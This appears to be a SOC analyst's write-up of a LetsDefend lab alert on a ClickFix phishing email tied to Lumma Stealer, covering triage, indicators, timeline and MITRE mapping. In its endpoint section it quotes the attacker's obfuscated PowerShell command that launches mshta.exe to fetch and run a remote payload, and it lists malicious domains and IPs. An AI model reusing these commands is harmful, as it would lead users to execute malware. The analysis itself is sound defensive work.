# Incident Investigation - [SOC338 Lumma Stealer - DLL Side-Loading via Click Fix Phishing]

> **Status:** Complete  
> **Date:** 2025-MAR-13  
> **Platform:** LetsDefend  
> **Severity:** Critical

---

# Objective

> Investigate an email alert indicating delivery of the Lumma Stealer malware through a ClickFix phishing campaign. Determine whether the email is malicious, whether the user interacted with the phishing content, and whether endpoint compromise occurred.

---

# Alert Information

| Field | Value |
|-------|-------|
| Alert Name | SOC338 - Lumma Stealer - DLL Side-Loading via ClickFix Phishing |
| Time Detected | March 13, 2025 09:44 AM |
| Severity | Critical |
| SMTP Server | 132.232.40.201 |
| Sender | update@windows-update.site |
| Recipient | dylan@letsdefend.io |
| Recipient's IP | 172.16.17.216 |
| Destination Server | 172.16.20.3 (Exchange) |
| Detection Rule | Suspicious phishing email associated with Lumma Stealer |

---

# Initial Triage

## Questions

- What triggered the alert?
- Is the source internal or external?
- Who owns the affected asset?
- Is the activity expected?
- What systems are involved?

### Initial Assessment

The email originated from an external domain impersonating a Windows Update notification. Initial indicators suggested a phishing campaign designed to trick the user into visiting a malicious website.

---

# Investigation

## 1. Asset Identification

### Affected User

Dylan

### Hostname

Dylan's workstation

### IP Address

172.16.17.216

### Mail Server

172.16.20.3 (Exchange)

### Last Logon

March 14, 2025 12:05 PM

---

## 2. Network Investigation

### Source

132.232.40.201

### Destination

Internal Microsoft Exchange Server (172.16.20.3)

### Reputation Checks

- VirusTotal
- AbuseIPDB
- Cisco Talos
- WHOIS / ASN

### Findings

- Source IP belongs to Tencent Cloud (AS45090).
- Multiple threat intelligence sources reported malicious activity associated with the sender.
- Email originated from the Internet and targeted an internal mailbox.

---

## 3. Email Investigation (if applicable)

### Sender

update@windows-update.site

### Recipient

dylan@letsdefend.io

### Subject

Windows Update Notification (spoofed)

### Attachments

None

### Embedded URLs
```
[-](https://www.windows-update.site/)
```
### Observations
- Sender domain impersonated Microsoft's Windows Update branding.
- Email attempted to convince the user to click an "Update Now" button.
- Testing the URL later showed the domain was no longer reachable.
- Overall characteristics strongly indicated a phishing campaign.
---

## 4. Endpoint Investigation

### Process Tree

```
Email Link > User Clicks > Powershell.exe > mshta.exe > Remote URL
```

### Suspicious Processes

- PowerShell.exe
- mshta.exe

### Command Line

```powershell
powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']')
```

```powershell
mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
```
#### Observations

- Approximately ten seconds after clicking the phishing link, PowerShell executed an obfuscated command.
- The command reconstructed and launched `mshta.exe`.
- The command contained the text:

> "I am not a robot - reCAPTCHA Verification"

This behavior is consistent with ClickFix phishing campaigns that socially engineer users into executing malicious PowerShell commands.

### File Activity

N/A

### Registry Activity

N/A

### Persistence

No persistence mechanisms were observed.

---

## 5. Timeline

| Time | Event |
|------|-------|
| 23:26:08 | User clicked phishing link |
| 23:26:19 | Obfuscated PowerShell command executed |
| 23:26:31 | PowerShell launched `mshta.exe` |
| 23:26:32 | Additional PowerShell execution observed |

---

## 6. Evidence Collected

### Indicators of Compromise

#### IP Addresses

- 132.232.40.201

#### Domains

- windows-update.site
- overcoatpassably.shop

#### URLs

```
https://www.windows-update.site/
```

```
https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
```

#### File Hashes

-

#### File Names

- maloy.mp4 (remote payload)

#### Suspicious Processes
- PowerShell.exe
- mshta.exe

#### Registry Keys

-

---

# MITRE ATT&CK Mapping

| Technique | ID |
|-----------|----|
| Phishing | T1566 |
| User Execution | T1204 |
| PowerShell | T1059.001 |
| Signed Binary Proxy Execution (MSHTA) | T1218.005 |

---

# Root Cause

> The attack began with a phishing email impersonating a Windows Update notification. After the user clicked the embedded link, a fake CAPTCHA page instructed the user to perform a verification action. Within seconds, an obfuscated PowerShell command reconstructed and executed `mshta.exe`, which attempted to retrieve a remote payload from an attacker-controlled domain.


---

# Impact Assessment

| Question | Result |
|-----------|--------|
| User clicked phishing link | Yes |
| PowerShell executed | Yes |
| MSHTA executed | Yes |
| Payload download attempted | Yes |
| Payload successfully retrieved | No evidence |
| Persistence established | No |
| Lateral movement observed | No |
| Data exfiltration observed | No |

---

# Response Actions

- Classified email as malicious
- Requested endpoint containment
- Documented indicators of compromise
-Verified malicious infrastructure
-Confirmed no persistence
- Determined Tier 2 escalation was not required

---

# Final Verdict

**Classification**

**True Positive**

**Summary**

Investigation confirmed a successful phishing attempt resulting in user execution of an obfuscated PowerShell command. The command leveraged `mshta.exe`, a legitimate Windows binary commonly abused by attackers, to retrieve a remote payload associated with a ClickFix phishing campaign.

Although the user executed the malicious command, no evidence indicated successful malware installation, persistence, or post-exploitation activity. The malicious infrastructure was no longer accessible during investigation, preventing payload retrieval. The endpoint was contained as a precaution, and the incident was closed without requiring Tier 2 escalation.

---

# Lessons Learned

- User interaction remains one of the most effective initial access vectors.
- Obfuscated PowerShell should always be investigated thoroughly.
- `mshta.exe` is a common LOLBin abused by malware and phishing campaigns.
- Correlating email telemetry with endpoint process execution provides a complete view of the attack chain.
- Reputation analysis helped quickly validate the malicious sender infrastructure.

---

# Skills Demonstrated

- Phishing Investigation
- Email Analysis
- IOC Collection
- Threat Intelligence
- PowerShell Analysis
- Windows Process Analysis
- LOLBin Detection (`mshta.exe`)
- Timeline Reconstruction
- Endpoint Investigation
- Incident Triage
- MITRE ATT&CK Mapping
- Incident Documentation
